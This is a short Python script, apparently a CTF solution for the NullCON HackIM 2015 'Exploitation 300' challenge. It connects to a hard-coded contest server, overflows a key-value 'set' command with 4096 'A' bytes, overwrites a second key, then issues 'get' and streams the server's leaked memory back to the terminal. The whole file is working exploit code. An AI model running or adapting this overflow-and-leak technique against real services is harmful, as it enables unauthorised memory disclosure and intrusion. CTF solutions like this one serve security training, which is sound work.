#!/usr/bin/python
#
# NullCON HackIM 2015
# Exploitation 300
# @danigargu
#

import os
import sys
from socket import *

HOST = '54.163.248.69'
PORT = 9003

def get_connection(host, port):
	s = socket(AF_INET, SOCK_STREAM)
	s.connect((HOST, PORT))
	return s

def main():

	s = get_connection(HOST, PORT)

	s.recv(0xFF)
	command = 'set test ' + 'A' * 4096 + "\n"
	print command
	s.send(command)
	print s.recv(0xFF)

	command = 'set key B\n'
	print command
	s.send(command)
	print s.recv(0xFF)

	command = 'get test\n'
	s.send(command)

	while True:
		sys.stdout.write(s.recv(1))

if __name__ == '__main__':
	main()

